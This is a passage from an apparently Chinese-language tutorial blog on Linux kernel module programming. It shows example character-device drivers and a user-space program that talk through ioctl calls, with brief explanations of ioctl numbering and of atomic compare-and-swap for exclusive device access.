class="line"> </span><br><span class="line">        <span class="keyword">break</span>; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">case</span> IOCTL_VALGET_NUM: </span><br><span class="line">        retval = __put_user(ioctl_num, (<span class="type">int</span> __user *)arg); </span><br><span class="line">        <span class="keyword">break</span>; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">case</span> IOCTL_VALSET_NUM: </span><br><span class="line">        ioctl_num = arg; </span><br><span class="line">        <span class="keyword">break</span>; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">default</span>: </span><br><span class="line">        retval = -ENOTTY; </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">done: </span><br><span class="line">    <span class="keyword">return</span> retval; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">test_ioctl_read</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">char</span> __user *buf, </span></span><br><span class="line"><span class="params">                               <span class="type">size_t</span> count, <span class="type">loff_t</span> *f_pos)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">test_ioctl_data</span> *<span class="title">ioctl_data</span> =</span> filp-&gt;private_data; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> val; </span><br><span class="line">    <span class="type">int</span> retval; </span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>; </span><br><span class="line"> </span><br><span class="line">    read_lock(&amp;ioctl_data-&gt;lock); </span><br><span class="line">    val = ioctl_data-&gt;val; </span><br><span class="line">    read_unlock(&amp;ioctl_data-&gt;lock); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (; i &lt; count; i++) &#123; </span><br><span class="line">        <span class="keyword">if</span> (copy_to_user(&amp;buf[i], &amp;val, <span class="number">1</span>)) &#123; </span><br><span class="line">            retval = -EFAULT; </span><br><span class="line">            <span class="keyword">goto</span> out; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    retval = count; </span><br><span class="line">out: </span><br><span class="line">    <span class="keyword">return</span> retval; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">test_ioctl_close</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *filp)</span> </span><br><span class="line">&#123; </span><br><span class="line">    pr_alert(<span class="string">&quot;%s call.\n&quot;</span>, __func__); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (filp-&gt;private_data) &#123; </span><br><span class="line">        kfree(filp-&gt;private_data); </span><br><span class="line">        filp-&gt;private_data = <span class="literal">NULL</span>; </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">test_ioctl_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *filp)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">test_ioctl_data</span> *<span class="title">ioctl_data</span>;</span> </span><br><span class="line"> </span><br><span class="line">    pr_alert(<span class="string">&quot;%s call.\n&quot;</span>, __func__); </span><br><span class="line">    ioctl_data = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> test_ioctl_data), GFP_KERNEL); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (ioctl_data == <span class="literal">NULL</span>) </span><br><span class="line">        <span class="keyword">return</span> -ENOMEM; </span><br><span class="line"> </span><br><span class="line">    rwlock_init(&amp;ioctl_data-&gt;lock); </span><br><span class="line">    ioctl_data-&gt;val = <span class="number">0xFF</span>; </span><br><span class="line">    filp-&gt;private_data = ioctl_data; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">fops</span> =</span> &#123; </span><br><span class="line">    .owner = THIS_MODULE, </span><br><span class="line">    .open = test_ioctl_open, </span><br><span class="line">    .release = test_ioctl_close, </span><br><span class="line">    .read = test_ioctl_read, </span><br><span class="line">    .unlocked_ioctl = test_ioctl_ioctl, </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">ioctl_init</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">dev_t</span> dev; </span><br><span class="line">    <span class="type">int</span> alloc_ret = <span class="number">-1</span>; </span><br><span class="line">    <span class="type">int</span> cdev_ret = <span class="number">-1</span>; </span><br><span class="line">    alloc_ret = alloc_chrdev_region(&amp;dev, <span class="number">0</span>, num_of_dev, DRIVER_NAME); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (alloc_ret) </span><br><span class="line">        <span class="keyword">goto</span> error; </span><br><span class="line"> </span><br><span class="line">    test_ioctl_major = MAJOR(dev); </span><br><span class="line">    cdev_init(&amp;test_ioctl_cdev, &amp;fops); </span><br><span class="line">    cdev_ret = cdev_add(&amp;test_ioctl_cdev, dev, num_of_dev); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (cdev_ret) </span><br><span class="line">        <span class="keyword">goto</span> error; </span><br><span class="line"> </span><br><span class="line">    pr_alert(<span class="string">&quot;%s driver(major: %d) installed.\n&quot;</span>, DRIVER_NAME, </span><br><span class="line">             test_ioctl_major); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">error: </span><br><span class="line">    <span class="keyword">if</span> (cdev_ret == <span class="number">0</span>) </span><br><span class="line">        cdev_del(&amp;test_ioctl_cdev); </span><br><span class="line">    <span class="keyword">if</span> (alloc_ret == <span class="number">0</span>) </span><br><span class="line">        unregister_chrdev_region(dev, num_of_dev); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">ioctl_exit</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">dev_t</span> dev = MKDEV(test_ioctl_major, <span class="number">0</span>); </span><br><span class="line"> </span><br><span class="line">    cdev_del(&amp;test_ioctl_cdev); </span><br><span class="line">    unregister_chrdev_region(dev, num_of_dev); </span><br><span class="line">    pr_alert(<span class="string">&quot;%s driver removed.\n&quot;</span>, DRIVER_NAME); </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">module_init(ioctl_init); </span><br><span class="line">module_exit(ioctl_exit); </span><br><span class="line"> </span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>); </span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;This is test_ioctl module&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>test_ioctl_ioctl</code>函数有一参数<code>cmd</code>，这个就是<code>ioctl_number</code>，<code>ioctl number</code>编码了major number，ioctl类型，命令和参数。通常使用宏表示(_IO, _IOR, _IOW, _IOWR)。内核与程序都应包含ioctl的头文件。内核模块调用的头文件是<code>chardev.h</code>，程序调用为<code>userspace_ioctl.c</code>。</p>
<p>另外，我们需要注意的是，对共享资源的并发访问将导致竞态条件。。解决方法是使用原子比较与交换(atomic Compare-And-Swap (CAS))。</p>
<p>一个完整的与device file通信的示例</p>
<p><code>char_dev2.c</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * chardev2.c - Create an input/output character device </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/atomic.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/cdev.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/delay.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/device.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span> <span class="comment">/* Specifically, a module */</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/printk.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/types.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span> <span class="comment">/* for get_user and put_user */</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/version.h&gt;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/errno.h&gt;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;chardev.h&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUCCESS 0 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_NAME <span class="string">&quot;char_dev&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_LEN 80 </span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span> </span><br><span class="line">    CDEV_NOT_USED = <span class="number">0</span>, </span><br><span class="line">    CDEV_EXCLUSIVE_OPEN = <span class="number">1</span>, </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Is the device open right now? Used to prevent concurrent access into </span></span><br><span class="line"><span class="comment"> * the same device </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">atomic_t</span> already_open = ATOMIC_INIT(CDEV_NOT_USED); </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* The message the device will give when asked */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">char</span> message[BUF_LEN + <span class="number">1</span>]; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="keyword">class</span> *<span class="title">cls</span>;</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This is called whenever a process attempts to open the device file */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">device_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span> </span><br><span class="line">&#123; </span><br><span class="line">    pr_info(<span class="string">&quot;device_open(%p)\n&quot;</span>, file); </span><br><span class="line"> </span><br><span class="line">    try_module_get(THIS_MODULE); </span><br><span class="line">    <span class="keyword">return</span> SUCCESS; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">device_release</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span> </span><br><span class="line">&#123; </span><br><span class="line">    pr_info(<span class="string">&quot;device_release(%p,%p)\n&quot;</span>, inode, file); </span><br><span class="line"> </span><br><span class="line">    module_put(THIS_MODULE); </span><br><span class="line">    <span class="keyword">return</span> SUCCESS; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This function is called whenever a process which has already opened the </span></span><br><span class="line"><span class="comment"> * device file attempts to read from it. </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">device_read</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="comment">/* see include/linux/fs.h   */</span> </span></span><br><span class="line"><span class="params">                           <span class="type">char</span> __user *buffer, <span class="comment">/* buffer to be filled  */</span> </span></span><br><span class="line"><span class="params">                           <span class="type">size_t</span> length, <span class="comment">/* length of the buffer     */</span> </span></span><br><span class="line"><span class="params">                           <span class="type">loff_t</span> *offset)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="comment">/* Number of bytes actually written to the buffer */</span> </span><br><span class="line">    <span class="type">int</span> bytes_read = <span class="number">0</span>; </span><br><span class="line">    <span class="comment">/* How far did the process reading the message get? Useful if the message </span></span><br><span class="line"><span class="comment">     * is larger than the size of the buffer we get to fill in device_read. </span></span><br><span class="line"><span class="comment">     */</span> </span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *message_ptr = message; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (!*(message_ptr + *offset)) &#123; <span class="comment">/* we are at the end of message */</span> </span><br><span class="line">        *offset = <span class="number">0</span>; <span class="comment">/* reset the offset */</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">/* signify end of file */</span> </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    message_ptr += *offset; </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Actually put the data into the buffer */</span> </span><br><span class="line">    <span class="keyword">while</span> (length &amp;&amp; *message_ptr) &#123; </span><br><span class="line">        <span class="comment">/* Because the buffer is in the user data segment, not the kernel </span></span><br><span class="line"><span class="comment">         * data segment, assignment would not work. Instead, we have to </span></span><br><span class="line"><span class="comment">         * use put_user which copies data from the kernel data segment to </span></span><br><span class="line"><span class="comment">         * the user data segment. </span></span><br><span class="line"><span class="comment">         */</span> </span><br><span class="line">        put_user(*(message_ptr++), buffer++); </span><br><span class="line">        length--; </span><br><span class="line">        bytes_read++; </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    pr_info(<span class="string">&quot;Read %d bytes, %ld left\n&quot;</span>, bytes_read, length); </span><br><span class="line"> </span><br><span class="line">    *offset += bytes_read; </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Read functions are supposed to return the number of bytes actually </span></span><br><span class="line"><span class="comment">     * inserted into the buffer. </span></span><br><span class="line"><span class="comment">     */</span> </span><br><span class="line">    <span class="keyword">return</span> bytes_read; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* called when somebody tries to write into our device file. */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">device_write</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">const</span> <span class="type">char</span> __user *buffer, </span></span><br><span class="line"><span class="params">                            <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">int</span> i; </span><br><span class="line"> </span><br><span class="line">    pr_info(<span class="string">&quot;device_write(%p,%p,%ld)&quot;</span>, file, buffer, length); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length &amp;&amp; i &lt; BUF_LEN; i++) </span><br><span class="line">        get_user(message[i], buffer + i); </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Again, return the number of input characters used. */</span> </span><br><span class="line">    <span class="keyword">return</span> i; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This function is called whenever a process tries to do an ioctl on our </span></span><br><span class="line"><span class="comment"> * device file. We get two extra parameters (additional to the inode and file </span></span><br><span class="line"><span class="comment"> * structures, which all device functions get): the number of the ioctl called </span></span><br><span class="line"><span class="comment"> * and the parameter given to the ioctl function. </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * If the ioctl is write or read/write (meaning output is returned to the </span></span><br><span class="line"><span class="comment"> * calling process), the ioctl call returns the output of this function. </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">long</span> </span><br><span class="line"><span class="title function_">device_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="comment">/* ditto */</span> </span></span><br><span class="line"><span class="params">             <span class="type">unsigned</span> <span class="type">int</span> ioctl_num, <span class="comment">/* number and param for ioctl */</span> </span></span><br><span class="line"><span class="params">             <span class="type">unsigned</span> <span class="type">long</span> ioctl_param)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">int</span> i; </span><br><span class="line">    <span class="type">long</span> ret = SUCCESS; </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* We don&#x27;t want to talk to two processes at the same time. */</span> </span><br><span class="line">    <span class="keyword">if</span> (atomic_cmpxchg(&amp;already_open, CDEV_NOT_USED, CDEV_EXCLUSIVE_OPEN)) </span><br><span class="line">        <span class="keyword">return</span> -EBUSY; </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Switch according to the ioctl called */</span> </span><br><span class="line">    <span class="keyword">switch</span> (ioctl_num) &#123; </span><br><span class="line">    <span class="keyword">case</span> IOCTL_SET_MSG: &#123; </span><br><span class="line">        <span class="comment">/* Receive a pointer to a message (in user space) and set that to </span></span><br><span class="line"><span class="comment">         * be the device&#x27;s message. Get the parameter given to ioctl by </span></span><br><span class="line"><span class="comment">         * the process. </span></span><br><span class="line"><span class="comment">         */</span> </span><br><span class="line">        <span class="type">char</span> __user *tmp = (<span class="type">char</span> __user *)ioctl_param; </span><br><span class="line">        <span class="type">char</span> ch; </span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* Find the length of the message */</span> </span><br><span class="line">        get_user(ch, tmp); </span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; ch &amp;&amp; i &lt; BUF_LEN; i++, tmp++) </span><br><span class="line">            get_user(ch, tmp); </span><br><span class="line"> </span><br><span class="line">        device_write(file, (<span class="type">char</span> __user *)ioctl_param, i, <span class="literal">NULL</span>); </span><br><span class="line">        <span class="keyword">break</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">case</span> IOCTL_GET_MSG: &#123; </span><br><span class="line">        <span class="type">loff_t</span> offset = <span class="number">0</span>; </span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* Give the current message to the calling process - the parameter </span></span><br><span class="line"><span class="comment">         * we got is a pointer, fill it. </span></span><br><span class="line"><span class="comment">         */</span> </span><br><span class="line">        i = device_read(file, (<span class="type">char</span> __user *)ioctl_param, <span class="number">99</span>, &amp;offset); </span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* Put a zero at the end of the buffer, so it will be properly </span></span><br><span class="line"><span class="comment">         * terminated. </span></span><br><span class="line"><span class="comment">         */</span> </span><br><span class="line">        put_user(<span class="string">&#x27;\0&#x27;</span>, (<span class="type">char</span> __user *)ioctl_param + i); </span><br><span class="line">        <span class="keyword">break</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">case</span> IOCTL_GET_NTH_BYTE: </span><br><span class="line">        <span class="comment">/* This ioctl is both input (ioctl_param) and output (the return </span></span><br><span class="line"><span class="comment">         * value of this function). </span></span><br><span class="line"><span class="comment">         */</span> </span><br><span class="line">        ret = (<span class="type">long</span>)message[ioctl_param]; </span><br><span class="line">        <span class="keyword">break</span>; </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* We&#x27;re now ready for our next caller */</span> </span><br><span class="line">    <span class="type">atomic_set</span>(&amp;already_open, CDEV_NOT_USED); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> ret; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Module Declarations */</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This structure will hold the functions to be called when a process does </span></span><br><span class="line"><span class="comment"> * something to the device we created. Since a pointer to this structure </span></span><br><span class="line"><span class="comment"> * is kept in the devices table, it can&#x27;t be local to init_module. NULL is </span></span><br><span class="line"><span class="comment"> * for unimplemented functions. </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">fops</span> =</span> &#123; </span><br><span class="line">    .read = device_read, </span><br><span class="line">    .write = device_write, </span><br><span class="line">    .unlocked_ioctl = device_ioctl, </span><br><span class="line">    .open = device_open, </span><br><span class="line">    .release = device_release, <span class="comment">/* a.k.a. close */</span> </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Initialize the module - Register the character device */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">chardev2_init</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="comment">/* Register the character device (atleast try) */</span> </span><br><span class="line">    <span class="type">int</span> ret_val = register_chrdev(MAJOR_NUM, DEVICE_NAME, &amp;fops); </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Negative values signify an error */</span> </span><br><span class="line">    <span class="keyword">if</span> (ret_val &lt; <span class="number">0</span>) &#123; </span><br><span class="line">        pr_alert(<span class="string">&quot;%s failed with %d\n&quot;</span>, </span><br><span class="line">                 <span class="string">&quot;Sorry, registering the character device &quot;</span>, ret_val); </span><br><span class="line">        <span class="keyword">return</span> ret_val; </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LINUX_VERSION_CODE &gt;= KERNEL_VERSION(6, 4, 0) </span></span><br><span class="line">    cls = class_create(DEVICE_FILE_NAME); </span><br><span class="line"><span class="meta">#<span class="keyword">else</span> </span></span><br><span class="line">    cls = class_create(THIS_MODULE, DEVICE_FILE_NAME); </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> </span></span><br><span class="line">    device_create(cls, <span class="literal">NULL</span>, MKDEV(MAJOR_NUM, <span class="number">0</span>), <span class="literal">NULL</span>, DEVICE_FILE_NAME); </span><br><span class="line"> </span><br><span class="line">    pr_info(<span class="string">&quot;Device created on /dev/%s\n&quot;</span>, DEVICE_FILE_NAME); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Cleanup - unregister the appropriate file from /proc */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">chardev2_exit</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123; </span><br><span class="line">    device_destroy(cls, MKDEV(MAJOR_NUM, <span class="number">0</span>)); </span><br><span class="line">    class_destroy(cls); </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Unregister the device */</span> </span><br><span class="line">    unregister_chrdev(MAJOR_NUM, DEVICE_NAME); </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">module_init(chardev2_init); </span><br><span class="line">module_exit(chardev2_exit); </span><br><span class="line"> </span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>chardev.h</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * chardev.h - the header file with the ioctl definitions. </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * The declarations here have to be in a header file, because they need </span></span><br><span class="line"><span class="comment"> * to be known both to the kernel module (in chardev2.c) and the process </span></span><br><span class="line"><span class="comment"> * calling ioctl() (in userspace_ioctl.c). </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CHARDEV_H </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHARDEV_H </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ioctl.h&gt;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* The major device number. We can not rely on dynamic registration </span></span><br><span class="line"><span class="comment"> * any more, because ioctls need to know it. </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAJOR_NUM 100 </span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Set the message of the device driver */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_SET_MSG _IOW(MAJOR_NUM, 0, char *) </span></span><br><span class="line"><span class="comment">/* _IOW means that we are creating an ioctl command number for passing </span></span><br><span class="line"><span class="comment"> * information from a user process to the kernel module. </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * The first arguments, MAJOR_NUM, is the major device number we are using. </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * The second argument is the number of the command (there could be several </span></span><br><span class="line"><span class="comment"> * with different meanings). </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * The third argument is the type we want to get from the process to the </span></span><br><span class="line"><span class="comment"> * kernel. </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Get the message of the device driver */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_GET_MSG _IOR(MAJOR_NUM, 1, char *) </span></span><br><span class="line"><span class="comment">/* This IOCTL is used for output, to get the message of the device driver. </span></span><br><span class="line"><span class="comment"> * However, we still need the buffer to place the message in to be input, </span></span><br><span class="line"><span class="comment"> * as it is allocated by the process. </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Get the n&#x27;th byte of the message */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_GET_NTH_BYTE _IOWR(MAJOR_NUM, 2, int) </span></span><br><span class="line"><span class="comment">/* The IOCTL is used for both input and output. It receives from the user </span></span><br><span class="line"><span class="comment"> * a number, n, and returns message[n]. </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* The name of the device file */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_FILE_NAME <span class="string">&quot;char_dev&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_PATH <span class="string">&quot;/dev/char_dev&quot;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p><code>userspace_ioctl.c</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*  userspace_ioctl.c - the process to use ioctl&#x27;s to control the kernel module </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> *  Until now we could have used cat for input and output.  But now </span></span><br><span class="line"><span class="comment"> *  we need to do ioctl&#x27;s, which require writing our own process.  </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* device specifics, such as ioctl numbers and the  </span></span><br><span class="line"><span class="comment"> * major device file. */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../chardev.h&quot;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> <span class="comment">/* standard I/O */</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span> <span class="comment">/* open */</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> <span class="comment">/* close */</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> <span class="comment">/* exit */</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span> <span class="comment">/* ioctl */</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Functions for the ioctl calls */</span> </span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">ioctl_set_msg</span><span class="params">(<span class="type">int</span> file_desc, <span class="type">char</span> *message)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">int</span> ret_val; </span><br><span class="line"> </span><br><span class="line">    ret_val = ioctl(file_desc, IOCTL_SET_MSG, message); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (ret_val &lt; <span class="number">0</span>) &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ioctl_set_msg failed:%d\n&quot;</span>, ret_val); </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> ret_val; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">ioctl_get_msg</span><span class="params">(<span class="type">int</span> file_desc)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">int</span> ret_val; </span><br><span class="line">    <span class="type">char</span> message[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;; </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Warning - this is dangerous because we don&#x27;t tell  </span></span><br><span class="line"><span class="comment">   * the kernel how far it&#x27;s allowed to write, so it  </span></span><br><span class="line"><span class="comment">   * might overflow the buffer. In a real production  </span></span><br><span class="line"><span class="comment">   * program, we would have used two ioctls - one to tell </span></span><br><span class="line"><span class="comment">   * the kernel the buffer length and another to give  </span></span><br><span class="line"><span class="comment">   * it the buffer to fill </span></span><br><span class="line"><span class="comment">   */</span> </span><br><span class="line">    ret_val = ioctl(file_desc, IOCTL_GET_MSG, message); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (ret_val &lt; <span class="number">0</span>) &#123; 